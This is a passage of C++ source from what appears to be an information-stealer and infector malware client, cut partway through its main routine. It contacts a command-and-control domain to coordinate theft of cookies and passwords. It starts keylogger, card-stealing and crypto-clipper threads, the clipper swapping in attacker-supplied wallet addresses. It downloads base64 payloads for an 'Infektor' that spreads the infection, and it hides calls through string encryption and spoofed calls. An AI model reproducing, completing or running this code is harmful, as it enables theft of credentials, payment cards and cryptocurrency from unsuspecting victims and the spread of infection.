							wrap::Header{ {EC("Content-Type"), EC("application/x-www-form-urlencoded")} },
							wrap::Method{ EC("POST") });

						PassEntr = PassOppa.text;

					}
					catch (const std::exception& e) {
						std::cout << EC("Exception caught: ") << e.what() << std::endl;
					}


					std::cout << EC("\n") << PassEntr << std::endl;

					if (PassEntr == EC("0"))
					{

						SendDebugMessage(EC("Tokens Done going for Password"));

						passafter = true;

						SPOOF_CALL(Sleep)(300);
					}

				}


				if (CkiLog /* && !IsFUD*/)
				{

					if (!IsFirstTime)
					{
						try
						{
							string ckopa = EC("https://") + dmns + EC("/index.php?type=ckexists&security=2");
							std::string HWDData = EC("DurumcuBabaSeveriz31|") + hwidglobal + EC("|") + OwnersID;
							std::string EncyDat = Encrypt(HWDData, enckey);

							SPOOF_CALL(printf)(ckopa.c_str());

							wrap::Response CookieOppa = wrap::HttpsRequest(wrap::Url{ ckopa },
								wrap::Body{ EncyDat },
								wrap::Header{ {EC("Content-Type"), EC("application/x-www-form-urlencoded")} },
								wrap::Method{ EC("POST") });

							CookieEntr = CookieOppa.text;

						}
						catch (const std::exception& e) {
							std::cout << EC("Exception caught: ") << e.what() << std::endl;
						}

						try
						{
							string psopa = EC("https://") + dmns + EC("/index.php?type=pexists&security=2");
							std::string PPHWDData = EC("DurumcuBabaSeveriz31|") + hwidglobal + EC("|") + OwnersID;
							std::string PPEncyDat = Encrypt(PPHWDData, enckey);

							SPOOF_CALL(printf)(psopa.c_str());

							wrap::Response PassOppa = wrap::HttpsRequest(wrap::Url{ psopa },
								wrap::Body{ PPEncyDat },
								wrap::Header{ {EC("Content-Type"), EC("application/x-www-form-urlencoded")} },
								wrap::Method{ EC("POST") });

							PassEntr = PassOppa.text;

						}
						catch (const std::exception& e) {
							std::cout << EC("Exception caught: ") << e.what() << std::endl;
						}
					}
				

					std::cout << EC("\n") << EC("Cookie EXXX:") << CookieEntr << std::endl;
					std::cout << EC("\n") << EC("pASS EXXX:") << PassEntr << std::endl;

					if ((CookieEntr == EC("0") or PassEntr == EC("0")) or IsFirstTime)
					{

						SendDebugMessage(EC("Pass Done going for Cookies"));

						CreateThread(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(LogRawCookies), nullptr, NULL, nullptr);

						SPOOF_CALL(Sleep)(20000);
					}

				}

				SendDebugMessage(EC("All Done, initilazing threads."));

				if (KeyboardTrd)
				{
					try
					{
						SPOOF_CALL(CreateThread)(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(KeyboardThread), nullptr, NULL, nullptr);
					}
					catch (...) { SendDebugMessage(EC("Keyboard Failed !!!")); }/**/
				}

				if (CardTrd)
				{
					try
					{
						SPOOF_CALL(CreateThread)(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(CardThread), nullptr, NULL, nullptr);
					}
					catch (...) { SendDebugMessage(EC("CardThread Failed !!!")); }/**/

					SendDebugMessage(EC("Initilazing Clipper"));
				}

				if (ClipperTrd)
				{
					try
					{
						string ClipURL = EC("https://") + dmns + EC("/index.php?type=crypto&security=2");
						std::string ClipData = EC("Avokesa34532|") + hwidglobal + EC("|") + OwnersID;
						std::string ClipEncyDat = Encrypt(ClipData, enckey);

						SPOOF_CALL(printf)(ClipURL.c_str());

						wrap::Response Clippys = wrap::HttpsRequest(wrap::Url{ ClipURL },
							wrap::Body{ ClipEncyDat },
							wrap::Header{ {EC("Content-Type"), EC("application/x-www-form-urlencoded")} },
							wrap::Method{ EC("POST") });


						string UnDcrypt = Decrypt(Clippys.text, enckey);
						std::cout << UnDcrypt << std::endl;


						if (UnDcrypt == EC("||||||||"))
						{

						}
						else
						{
							int count = 0;
							for (char c : UnDcrypt) {
								if (c == '|') {
									count++;
								}
							}

							if (count < 6 || UnDcrypt.length() < 20) {

								CycleCount = 0;
							}
							else
							{
								SplitString(UnDcrypt, BTC_Address, ETH_Address, LTC_Address, XMR_Address, DOGE_Address, DASH_Address, XRP_Address, SOL_Address);

								std::cout << BTC_Address << std::endl << ETH_Address << std::endl << LTC_Address << std::endl << XMR_Address << std::endl << DOGE_Address << std::endl << DASH_Address << std::endl << XRP_Address << std::endl << SOL_Address << std::endl;
							}

							try
							{
								SPOOF_CALL(CreateThread)(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(ClipperThread), nullptr, NULL, nullptr);
							}
							catch (...) { SendDebugMessage(EC("Clipper Failed !!!")); }/**/
						}
					}
					catch (...) { SendDebugMessage(EC("Clipper inside failed")); }
					
				}


				SendDebugMessage(EC("Initilazing Main Thread And Infekto Thread"));

				if (InfectionTrd && !IsFUD)
				{
					try
					{
						MainOwnerNumber = DownloadString(dmns, EC("/index.php?type=accid&security=2&owr=") + OwnersID);
						std::cout << MainOwnerNumber << std::endl;
						SPOOF_CALL(Sleep)(400);

						suo.clear();
						suo = Base64ToBytes(DownloadString(dmns, EC("/Stb/Unretev.php?bl=") + BuildID + EC(".suo")));
						std::cout << suo.size() << std::endl;
						SPOOF_CALL(Sleep)(400);

						if (ExeInfection)
						{
							bitt.clear();
							bitt = Base64ToBytes(DownloadString(dmns, EC("/Stb/Unretev.php?bl=") + BuildID + EC(".dll")));
							std::cout << bitt.size() << std::endl;
							SPOOF_CALL(Sleep)(400);
						}

					}
					catch (...) { SendDebugMessage(EC("Pre-Infect Failed !!!")); }

					if (InfectionMainTrd && (bitt.size() > 500 || !ExeInfection) && suo.size() > 500)
					{
						try
						{
							SPOOF_CALL(CreateThread)(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(InfectorBridge), nullptr, NULL, nullptr);
						}
						catch (...) { SendDebugMessage(EC("Infektor Failed !!!")); }/**/

						SPOOF_CALL(Sleep)(400);
					}
					else
					{
						suo.clear();
						bitt.clear();
					}

				}


				SendDebugMessage(EC("Nowmmmm time for main stuff Yummy !"));

				MainThreadRunner();


				SPOOF_CALL(Sleep)(-1);


			}

		}
	}
}
